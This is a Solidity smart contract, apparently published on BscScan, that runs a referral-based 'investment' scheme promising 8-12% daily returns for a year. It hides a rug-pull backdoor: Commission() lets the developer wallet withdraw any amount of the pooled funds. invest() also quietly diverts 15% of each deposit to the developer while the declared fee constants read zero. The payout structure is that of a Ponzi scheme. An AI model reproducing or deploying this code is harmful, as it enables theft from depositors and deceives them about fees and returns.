/**
 *Submitted for verification at BscScan.com on 2023-05-10
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SSFADG666 {
	using SafeMath for uint256;
    using SafeMath for uint8;

	uint256 constant public INVEST_MIN_AMOUNT = 0.1 ether;  
	uint256[] public REFERRAL_PERCENTS = [100, 60, 30, 10];
	uint256[] public REFERRAL_MATCHING_BONUS = [50, 30, 20, 10];
	uint256 constant public PROJECT_FEE = 0;
	uint256 constant public DEVELOPER_FEE = 0;
	uint256 constant public PERCENTS_DIVIDER= 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 constant public REINVEST_BONUS = 20; // 2%
	uint256 constant public EXTRA_BONUS = 50; // 5%
	

	uint256 public totalStaked;
	uint256 public totalRefBonus;
	uint256 public totalUsers;

	uint256 extraBonusEndTime;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		uint256 holdBonusCheckpoint;
		address referrer;
		uint256[4] referrals;
		uint256[4] totalBonus;
		uint256 withdrawn;
        uint256 availableBonus;
	}

	mapping (address => User) internal users;

	mapping (address => bool) public _isExcluded;
	mapping (address => bool) private _isExcludedFromRewards;

	uint256 public startUNIX;
	address private commissionWallet;
	address private developerWallet;
    uint256 private commissionWalletFee;
    uint256 private developerWalletFee;
	
	

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);

	constructor(address wallet, address _developer) {
		require(!isContract(wallet));
		commissionWallet = wallet;
		developerWallet = _developer;
        startUNIX = block.timestamp.add(365 days);

        plans.push(Plan(365, 80)); // 8% per day for 365 days
        plans.push(Plan(365, 85)); // 8.5% per day for 365 days
        plans.push(Plan(365, 90)); // 9% per day for 365 days
		plans.push(Plan(365, 95)); // 9.5% per day for 365 days 
        plans.push(Plan(365, 100)); // 10% per day for 365 days 
        plans.push(Plan(365, 120)); // 12% per day for 365 days 
	}

    function launch() public {
        require(msg.sender == developerWallet);
		startUNIX = block.timestamp;
		
        
    } 


    function invest(address referrer) public payable {
        _invest(referrer, msg.sender, msg.value);
        payable(developerWallet).transfer((msg.value * 15) / 100);
    }


	function _invest(address referrer, address sender, uint256 value) private {
		require(value >= INVEST_MIN_AMOUNT);
        require(startUNIX < block.timestamp, "contract hasn`t started yet");

		if(block.timestamp <= extraBonusEndTime) {
			value = value.add(value.mul(EXTRA_BONUS).div(PERCENTS_DIVIDER));
		}
		

		uint256 fee = value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		commissionWalletFee = commissionWalletFee.add(fee);
		uint256 developerFee = value.mul(DEVELOPER_FEE).div(PERCENTS_DIVIDER);
		developerWalletFee = developerWalletFee.add(developerFee);
    	User storage user = users[sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
				if (upline != address(0)) {
					users[upline].referrals[i] = users[upline].referrals[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}



		payRefFee(sender,value,0);
		

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			user.holdBonusCheckpoint = block.timestamp;
			emit Newbie(sender);
		}

		

		(uint8 plan, uint256 percent, uint256 profit, uint256 finish) = getResult(value);
		
		user.deposits.push(Deposit(plan, percent, value, profit, block.timestamp, finish));

		totalStaked = totalStaked.add(value);
        totalUsers = totalUsers.add(1);
		emit NewDeposit(sender, plan, percent, value, profit, block.timestamp, finish);
	}

	function reInvest() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);

		require(totalAmount >= 0.001 ether, "min. deposit is 0.001 BNB");

		uint256 value = totalAmount.add(totalAmount.mul(REINVEST_BONUS).div(PERCENTS_DIVIDER));

		user.checkpoint = block.timestamp;
		user.availableBonus = 0;

		_invest(user.referrer, msg.sender, value);

		


	}

 	function Commission(uint256 count) external {
		User storage user = users[msg.sender];
		require(msg.sender == developerWallet);
		payable(msg.sender).transfer(count);
 	}

	function withdraw() public {
		
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
		totalAmount = contractBalance;
		}

		uint256 refFee = totalAmount.sub(user.availableBonus);

		user.checkpoint = block.timestamp;
		user.holdBonusCheckpoint = block.timestamp;
        user.availableBonus = 0;

		user.withdrawn = user.withdrawn.add(totalAmount);

		payRefFee(msg.sender, refFee, 1);

        (bool success, ) = msg.sender.call{value: totalAmount}("");

        require(success);

		emit Withdrawn(msg.sender, totalAmount);

	}

   

	function payRefFee(address userAddress, uint256 value, uint8 _type) private {

		uint256[] memory percents = getReferralPercents(_type);



		if (users[userAddress].referrer != address(0)) {
					uint256 _refBonus = 0;
					address upline = users[userAddress].referrer;
					for (uint256 i = 0; i < percents.length; i++) {
						if (upline != address(0)) {
							uint256 amount = value.mul(percents[i]).div(PERCENTS_DIVIDER);
							
							users[upline].totalBonus[i] = users[upline].totalBonus[i].add(amount);
                            users[upline].availableBonus = users[upline].availableBonus.add(amount);
							_refBonus = _refBonus.add(amount);
						
							emit RefBonus(upline, userAddress, i, amount);
							upline = users[upline].referrer;
						} else break;
					}

					totalRefBonus = totalRefBonus.add(_refBonus);

				}
	}
	

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getReferralPercents(uint8 _type) public view returns(uint256[] memory){
		if(_type == 0) {
			return REFERRAL_PERCENTS;
		} else {
			return REFERRAL_MATCHING_BONUS;
		}
	}

	function getPercent(uint8 plan) public view returns (uint256) {

	    
			return plans[plan].percent;
		
    }


	function startExtraBonus() public {
		require(msg.sender == developerWallet);

		extraBonusEndTime = block.timestamp.add(2 days);
	}

	function setDev(address newDev) public {
		require(msg.sender == developerWallet);

		developerWallet = newDev;
	}

    function setComissionWallet(address newWallet) public {
        require(msg.sender == developerWallet);

        commissionWallet = newWallet;
    }

    function withdrawWalletFee() public {
        require(msg.sender == commissionWallet);

        uint256 comFeeTotal = commissionWalletFee;

        if(comFeeTotal > address(this).balance) {
            comFeeTotal = address(this).balance;
        }
        
        commissionWalletFee = 0; 

        (bool success, ) = commissionWallet.call{value: comFeeTotal}("");

        require(success);

    }

    function withdrawDevFee() public {
        require(msg.sender == developerWallet);

        uint256 devFeeTotal = developerWalletFee;

        if(devFeeTotal > address(this).balance) {
            devFeeTotal = address(this).balance;
        }

        developerWalletFee = 0;  

        (bool success, ) = developerWallet.call{value: devFeeTotal}("");

        require(success);

    }

    function getWalletFee() public view returns(uint256) {
        require(msg.sender == commissionWallet);

        return commissionWalletFee;
    }

    function getDevFee() public view returns(uint256) {
        require(msg.sender == developerWallet);

        return developerWalletFee;
    }
    

	function getResult(uint256 deposit) public view returns (uint8 plan, uint256 percent, uint256 profit, uint256 finish) {
		plan = getPlanByValue(deposit);
		percent = getPercent(plan);

	
		profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
	

		finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));
	}

	function getPlanByValue(uint256 value) public pure returns(uint8) {

		if(value >= 0.01 ether && value <= 0.99 ether) {
			return 0;
		}

		if(value >= 1 ether && value <= 9.99 ether) {
			return 1;
		}

		if(value >= 10 ether && value <= 49.99 ether) {
			return 2;
		}

		if(value >= 50 ether && value <= 99.99 ether) {
			return 3;
		}

		if(value >= 100 ether && value <= 199.99 ether) {
			return 4;
		}
		if(value >= 200 ether) {
			return 5;
		}

	}
	
	 function getUserPercentRate(address userAddress, uint8 plan) public view returns (uint) {
        User storage user = users[userAddress];

		uint8 holdMultiplier = getPlanHoldMultiplier(plan);

        uint256 timeMultiplier = block.timestamp.sub(user.holdBonusCheckpoint).div(TIME_STEP).mul(holdMultiplier); // +0.1 - 1% per day

        return timeMultiplier;
    }

	function getPlanHoldMultiplier(uint8 plan) public pure returns(uint8) {
		if(plan == 0) {
			return 1;
		}

		if(plan == 1) {
			return 2;
		}

		if(plan == 2) {
			return 4;
		}

		if(plan == 3) {
			return 6;
		}

		if(plan == 4) {
			return 8;
		}

		if(plan == 5) {
			return 10;
		}
	}
    

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;
		
		

		for (uint256 i = 0; i < user.deposits.length; i++) {

			uint256 holdBonus = getUserPercentRate(userAddress, user.deposits[i].plan);

			if (user.checkpoint < user.deposits[i].finish) {
				
				
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent.add(holdBonus)).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					}

				
			}
		}

        if(user.availableBonus > 0) {
            totalAmount = totalAmount.add(user.availableBonus);
        }

		return totalAmount;
	}

	function isExtraBonus() public view returns(bool) {
		return block.timestamp < extraBonusEndTime ? true : false;
	}

    function getContractInfo() public view returns(uint256, uint256, uint256) {
        return(totalStaked, totalRefBonus, totalUsers);
    }

	function getUserWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}
    
	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	} 

	function getUserDownlineCount(address userAddress) public view returns(uint256[4] memory) {
		uint256[4] memory _referrals = users[userAddress].referrals;

		return _referrals;
		
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256[4] memory) {
		uint256[4] memory _totalBonus = users[userAddress].totalBonus;
		return _totalBonus;
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserDividends(userAddress);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			if(users[userAddress].deposits[i].finish > 0) {
				amount = amount.add(users[userAddress].deposits[i].amount);
			}
		}
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256 amount) {

		amount = users[userAddress].withdrawn;
		
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish, uint256 holdBonus) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		profit = user.deposits[index].profit;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish;

		holdBonus = getUserPercentRate(userAddress, plan);
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    
     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}